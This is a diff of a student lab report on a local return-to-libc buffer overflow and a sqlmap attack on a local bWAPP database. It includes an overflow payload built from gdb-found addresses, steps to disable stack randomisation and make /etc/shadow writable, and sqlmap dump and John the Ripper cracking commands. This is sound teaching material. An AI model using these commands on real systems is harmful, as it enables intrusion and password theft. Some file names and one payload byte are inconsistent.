@@ -1,3 +1,4 @@
+# TangTamNhu
 # Lab #1, 20110431, Tang Tam Nhu, INSE3308E_03FIE
 # Task 1: Software buffer overflow attack
  
@@ -40,53 +41,41 @@ void main() {
 **Answer 1**: Must conform to below structure:
   
 Description text (optional)
-- We'll create 2 file `taskbuffer.c` and `shellcode.c` that contains 2 code content above
-- Here is the stack frame `taskbuffer.c` program:
-![stackframe](image-1.png)
+- We will sequentially create the two C files specified above, named `vul.c` and `shel.o`.
+- HThis is the stack frame of `vul.c` program:
+![stackframe](./img/stack-frame.png)
 
-- Compile `taskbuffer.c` program and `shellcode.c` program to executable code.
+- Compile `vul.c` program and `shel.c` program to executable code.
       
-![img0](image-2.png)
+![compileprogram](./img/compile-program.png)
 
-- We will use Code Insert to insert shellcode directly into the program.
-- We will create a payload that includes:
-- First 16 bytes to fill the buffer.
-- The shellcode address to override the program's return address.
-- Use an older bash and turn off randomly given stack value.
 
-![img1](image-3.png)
+- Turn off the randomly assigned stack value and use an older bash.
 
-- Create environmet variable `nhu` with `export`
+![turnoff](./img/turnoff.png)
+
+- Create environmet variable `PRELOAD` with `export`
   
-![img2](image-4.png)
+![preload](./img/pwd.png)
 
-- We need to find the address of `system`, `exit` and `nhu` variable and load `taskbuffer.out` into `gdb` and find them.
+- Only the root user can write to  /etc/shadow file due to we need to set uid bit for shel.o and write permissions to /etc/shadow.
+
+![etc](./img/etc.png)
+
+- We need to find the address of `system`, `exit` and `PRELOAD` variable and load `vul.o` into `gdb` and find them.
   - Address value of system: `0xf7e50db0` will be inserted with format `\xb0\x0d\xe5\xf7`
   - Address value of exit: `0xf7e449e0` will be inserted with format `\xe0\x49\xe4\f7`
-  - Address value of the string of `nhu`: `0xffffde58` will be inserted with format `\x58\xde\xff\xff`
+  - Address value of the string of `PRELOAD`: `0xffffd8dd` will be inserted with format `\xdd\xd8\xff\xff`
  
-![img3](https://github.com/user-attachments/assets/cfe172ed-b234-4c03-8190-4f101d198441)
+![sys](./img/sys.png)
+![img3](./img/preload.png)
 
 - Examine the stack frame. We need to add 20 bytes of padding, followed by the system address (4 bytes), exit (4 bytes), and preload (4 bytes). Thus, this is our directive:
 ```
-r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x58\xde\xff\xff')")
+r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\xdd\xd8\xff\xff')")
 ```
-![frame-system](https://github.com/user-attachments/assets/200582bf-198b-48b6-8522-e91b596af9ac)
-![img4](https://github.com/user-attachments/assets/7eda45ff-b92b-43a1-8199-a9f8d24dd397)
+![python](./img/python.png)
 
-
-output screenshot (optional)
-
-- Before
-  
-![img5]()
-
-- After
-
-![win]()
-
-
-**Conclusion**: The buffer overflow vulnerability in the C program was successfully exploited using shellcode injection, return-to-lib-c.
 
 # Task 2: Attack on the database of bWapp 
 - Install bWapp (refer to quang-ute/Security-labs/Web-security). 
@@ -95,11 +84,11 @@ output screenshot (optional)
 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**: 
-- Use the command below to get users information and crack the password
+- Use the command below to get database
 ```
 python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=ad&Password=asd" --dbs --batch
 ```
-![sql2](image-5.png) 
+![sql2](./img/image-5.png) 
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**: 
@@ -108,21 +97,21 @@ python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=ad&Password=
 python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=ad&Password=asd" --dbs --tables --batch
 
 ```
-![sql3](image-6.png)
+![sql3](./img/image-6.png)
 
 - Use the command below to get users information and crack the password
 ```
 python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=ad&Password=asd" --dump --batch
 ```
-![sql4](image-8.png)
+![sql4](./img/image-8.png)
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
 - We already dumpped and stored the hashed password to a file for further exploit.
 - To identity the hash algorithm, we will use hashid which is a library in python (hashid -mj hash_pw.txt)
-![alt text](image-13.png)
+![alt text](./img/image-9.png)
 - According to Hashid, john, notably the raw-sha1 format, can be used to crack the encryption: https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU
 ```
     john --format=Raw-SHA1 hash_pw.txt
 ```
-![alt text](image-11.png)
+![alt text](./img/image-10.png)
